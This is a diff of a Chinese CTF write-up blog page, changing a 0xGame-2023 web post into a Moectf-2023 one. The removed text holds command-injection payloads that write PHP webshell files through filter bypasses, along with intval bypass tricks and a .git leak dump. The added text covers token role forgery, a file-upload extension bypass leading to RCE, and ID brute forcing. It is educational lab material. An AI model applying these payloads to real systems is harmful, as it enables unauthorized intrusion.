@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>0xGame-2023 | Secfeng</title>
-  <meta name="keywords" content=" 0xGame ">
-  <meta name="description" content="0xGame-2023 | Secfeng">
+  <title>Moectf-2023 | Secfeng</title>
+  <meta name="keywords" content=" Moectf ">
+  <meta name="description" content="Moectf-2023 | Secfeng">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="about">
@@ -441,9 +441,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-0xGame-2023" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Moectf-2023" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">0xGame-2023</h1>
+        <h1 class="article-title">Moectf-2023</h1>
     
     <div class="article-meta">
         
@@ -453,19 +453,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color2">0xGame</a>
+            <a class="color2">Moectf</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2023-10-05 20:47:45'>2023-10-02 18:30</time>
+            发布时间 : <time class="date" title='最后更新: 2023-10-04 20:57:53'>2023-10-04 16:54</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:900</span>
+        <span>字数:841</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -484,7 +484,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#week1"><span class="toc-text">week1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#signin"><span class="toc-text">signin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-http"><span class="toc-text">hello_http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-php"><span class="toc-text">baby_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ping"><span class="toc-text">Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#repo-leak"><span class="toc-text">repo_leak</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#http"><span class="toc-text">http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-text">Web入门指北</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%BC%E5%B2%B8%E7%9A%84flag"><span class="toc-text">彼岸的flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie"><span class="toc-text">cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gas-gas-gas"><span class="toc-text">gas!gas!gas!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#moe%E5%9B%BE%E5%BA%8A"><span class="toc-text">moe图床</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E6%B5%B7%E6%8D%9E%E9%92%88"><span class="toc-text">大海捞针</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#meo%E5%9B%BE%E5%BA%8A"><span class="toc-text">meo图床</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -500,69 +500,123 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>这道题是信息搜集，打开题目后查看源代码，有个<code>assets/index-33309f51.js</code>，打开后在页面最底部可发现一个<code>sourceMappingURL=index-33309f51.js.map</code>,猜测可能是sourcemap文件泄露</p>
-<p>将url栏中的<code>index-33309f51.js</code>用<code>index-33309f51.js.map</code>替换，即可下载文件</p>
-<p>然后用reverse-sourcemap工具还原文件</p>
-<pre><code>reverse-sourcemap -v index-33309f51.js.map -o output
-</code></pre>
-<img src="/2023/10/02/0xGame-2023/185016.png" class="">
+        <h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><img src="/2023/10/04/Moectf-2023/170243.png" class="">
 
-<p>最后找了半天在src&#x2F;main.js里面找到了flag</p>
-<h3 id="hello-http"><a href="#hello-http" class="headerlink" title="hello_http"></a>hello_http</h3><p>这道题就是改请求包的数据</p>
-<img src="/2023/10/02/0xGame-2023/194458.png" class="">
+<p>对应着要求改包就行</p>
+<img src="/2023/10/04/Moectf-2023/171502.png" class="">
 
-<h3 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h3><img src="/2023/10/02/0xGame-2023/194707.png" class="">
+<h3 id="Web入门指北"><a href="#Web入门指北" class="headerlink" title="Web入门指北"></a>Web入门指北</h3><p>将压缩包下载下来，在pdf最后可找到一个字符串，先16进制解码，再base64解码即可</p>
+<h3 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h3><p>F12全局审查元素搜索关键字<code>moectf</code>,成功发现在注释里藏着的flag</p>
+<pre><code>&lt;!--经过tracker，破获出内容为moectf&#123;find_comments_0m9M43IkulWxnEustqohoxoa3zEsToT7&#125;--&gt;
+</code></pre>
+<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>先下载attachments.tar:</p>
+<img src="/2023/10/04/Moectf-2023/174032.png" class="">
 
-<p>这道题原本思考了一下用c&#x3D;1024e2fff绕过，结果在本地可以，在靶场里就是不行，后面发现靶场用的是php7.4.27</p>
-<p>所以这道题最后用c&#x3D;1024.2fff成功绕过</p>
-<p>究其原因就是大概php7.0.9以上intval函数会自动识别字符串中的科学计数法</p>
-<p>总结一下intval常见的绕过思路：</p>
-<p><strong>int intval( $var, $base )</strong></p>
-<p>base参数可选</p>
-<p>当var为整形数字时，函数自动识别var使用的进制</p>
-<p>当var为字符串时，将base设置为0后可自动识别var使用的进制</p>
-<pre><code>绕过思路：
-1、进制自动转换
-2、数组绕过
-3、转换小数
-4、字符串整形转换（0x，0b,e）(php7.0以上已经可以识别科学计数法e)
-5、取反~ (当某个数字被过滤时，可以两次取反来绕过:intval(~~10)==intval(10))
-6、算数运算符（如果传入的 $var参数（只支持整形，不支持字符串）包含算数运算符，会先运算，再对运算结果进行转换）
-7、浮点数精度丢失问题（intval(0.58*100.0)==57）
-</code></pre>
-<h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><p>这道题就是命令执行</p>
-<p>抓包然后用连接符执行命令</p>
-<pre><code>（1）; //分号，没有任何逻辑关系的连接符。当多个命令用分号连接时，各命令之间的执行成功与否彼此没有任何影响，都会一条一条执行下去。
-（2）|| //逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。
-（3）&amp;&amp; //逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行，与 || 正好相反。
-</code></pre>
-<p>但是测试时发现&#x2F;和空格被ban了，空格可以用%09绕过，&#x2F;不能用没法跳转目录</p>
-<p>第二种方法就是写文件</p>
-<pre><code>127.0.0.1&amp;echo%09&quot;&lt;?php%09eval(&quot;ls&quot;);&quot;%09&gt;hhh.php
-</code></pre>
-<p>但是进入文件后发现报错，测试了一下发现<code>;</code>也被ban了</p>
-<p>后面才知道还有一种方法，用base64编码</p>
-<p>先将<code>&lt;?php eval(&quot;ls&quot;);</code>base64编码为PD9waHAlMDlldmFsKCJscyIpOw&#x3D;&#x3D;（注意编码后的字符串不能有加号，加号会被url解码为空格然后再ban掉）</p>
-<p>然后再使用管道连接符base64解码命令</p>
-<pre><code>127.0.0.1&amp;echo%09&quot;PD9waHAlMDlldmFsKCJscyIpOw==&quot;|base64%09-d%09&gt;hhh.php
-</code></pre>
-<pre><code>| 管道连接符，使用此管道符“|”可以将两个命令分隔开，“|”左边命令的输出就会作为“|”右边命令的输入，此命令可连续使用
-</code></pre>
-<p>后面发现这道题还可以看api.php的源码</p>
-<h3 id="repo-leak"><a href="#repo-leak" class="headerlink" title="repo_leak"></a>repo_leak</h3><p>这道题要拿githacker跑</p>
-<p>githacker –url <a target="_blank" rel="noopener" href="http://120.27.148.152:50013/.git/">http://120.27.148.152:50013/.git/</a> –output-folder result</p>
-<p>进入目录后查看历史版本 </p>
-<pre><code>git log --reflog
-</code></pre>
-<img src="/2023/10/02/0xGame-2023/200429.png" class="">
+<p>可以看到是一些json格式的数据</p>
+<p>根据提示，我们先注册</p>
+<p>返回数据包{“error”: “ok”, “data”: {“status”: “ok”}}</p>
+<p>然后登录：</p>
+<img src="/2023/10/04/Moectf-2023/174646.png" class="">
 
-<p>切换到有flag的版本</p>
-<pre><code>git reset --hard 8a5b670558921bd232d75b29542492f00698298b
+<p>这次返回了一个token：eyJ1c2VybmFtZSI6ICJmZW5nIiwgInBhc3N3b3JkIjogIjEyMzQ1NiIsICJyb2xlIjogInVzZXIifQ&#x3D;&#x3D;</p>
+<p>将此token携带上再次发包，并且请求头改为GET &#x2F;flag</p>
+<p>返回一个假flag</p>
+<p>base64解码token试试：</p>
+<pre><code>&#123;&quot;username&quot;: &quot;feng&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;role&quot;: &quot;user&quot;&#125;
 </code></pre>
-<p>在当前目录匹配包含flag的文件</p>
-<pre><code>grep -r  &quot;flag&quot; ./
+<p>将role的值改为admin再base64编码发包，成功获得flag</p>
+<h3 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h3><p>这道题要写脚本：</p>
+<pre><code>import requests
+import re
+session=requests.session()
+url=&quot;http://localhost:59398&quot;
+data=&#123;
+&quot;driver&quot;:&quot;ttycp3&quot;,
+&quot;steering_control&quot;:&#39;0&#39;,
+&quot;throttle&quot;:&#39;2&#39;
+&#125;
+for i in range(7):
+s=session.post(url=url,data=data)
+if &quot;moectf&quot; in s.text:
+print(s.text)
+break
+att=re.findall(&quot;&lt;font color=\&quot;red\&quot;&gt;([\u4e00-\u9fa5！，]+)&quot;,s.text)
+print(att)
+if &quot;直行&quot; in att[0]:
+data[&quot;steering_control&quot;]=&#39;0&#39;
+elif &quot;左&quot; in att[0]:
+data[&quot;steering_control&quot;]=&#39;1&#39;
+print(data)
+elif &quot;右&quot; in att[0]:
+data[&quot;steering_control&quot;]=&#39;-1&#39;
+if &quot;保持&quot; in att[0]:
+data[&quot;throttle&quot;]=&#39;1&#39;
+elif &quot;大&quot; in att[0]:
+data[&quot;throttle&quot;]=&#39;2&#39;
+elif &quot;小&quot; in att[0]:
+data[&quot;throttle&quot;]=&#39;0&#39;
 </code></pre>
-<img src="/2023/10/02/0xGame-2023/201628.png" class="">
+<h3 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h3><p>经过测试发现只能上传.png文件，而且不能上传.htaccess</p>
+<p>后面发现更改name的值可以显示源码：</p>
+<img src="/2023/10/04/Moectf-2023/194707.png" class="">
+
+<pre><code>&lt;?php
+$targetDir = &#39;uploads/&#39;;
+$allowedExtensions = [&#39;png&#39;];
+
+if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39; &amp;&amp; isset($_FILES[&#39;file&#39;])) &#123;
+    $file = $_FILES[&#39;file&#39;];
+    $tmp_path = $_FILES[&#39;file&#39;][&#39;tmp_name&#39;];
+    if ($file[&#39;type&#39;] !== &#39;image/png&#39;) &#123;
+        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件类型不符合要求&#39;]));
+    &#125;
+    if (filesize($tmp_path) &gt; 512 * 1024) &#123;
+        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件太大&#39;]));
+    &#125;
+    $fileName = $file[&#39;name&#39;];
+    $fileNameParts = explode(&#39;.&#39;, $fileName);
+    if (count($fileNameParts) &gt;= 2) &#123;
+        $secondSegment = $fileNameParts[1];
+        if ($secondSegment !== &#39;png&#39;) &#123;
+            die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件后缀不符合要求&#39;]));
+        &#125;
+    &#125; else &#123;
+        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件后缀不符合要求&#39;]));
+    &#125;
+    $uploadFilePath = dirname(__FILE__) . &#39;/&#39; . $targetDir . basename($file[&#39;name&#39;]);
+    if (move_uploaded_file($tmp_path, $uploadFilePath)) &#123;
+        die(json_encode([&#39;success&#39; =&gt; true, &#39;file_path&#39; =&gt; $uploadFilePath]));
+    &#125; else &#123;
+        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件上传失败&#39;]));
+    &#125;
+&#125;
+else&#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt;
+</code></pre>
+<p>审计一下发现它只对文件名第一个点后面的内容作检测，所以我们只需要传个hhh.png.php即可绕过</p>
+<p>然后rce</p>
+<h3 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h3><img src="/2023/10/04/Moectf-2023/200522.png" class="">
+
+<p>根据题目提示，对id进行爆破</p>
+<img src="/2023/10/04/Moectf-2023/201818.png" class="">
+
+<p>在长度明显与别的有很大差别的163中找到flag</p>
+<h3 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h3><p>这道题没有对后缀做限制，先正常访问传上去的php文件发现空白，我们随便修改文件名会报错：</p>
+<img src="/2023/10/04/Moectf-2023/204413.png" class="">
+
+<p>我们尝试访问index.php，然后下载图片查看源码，里面啥也没有，再尝试&#x2F;flag:</p>
+<pre><code>hello~
+Flag Not Here~
+Find Somewhere Else~
+&lt;!--Fl3g_n0t_Here_dont_peek!!!!!.php--&gt;
+Not Here~~~~~~~~~~~~~ awa
+</code></pre>
+<p>再访问Fl3g_n0t_Here_dont_peek!!!!!.php，这个文件想当然会在&#x2F;var&#x2F;www&#x2F;html文件夹下面</p>
+<img src="/2023/10/04/Moectf-2023/205508.png" class="">
+
+<p>数组绕过即可</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
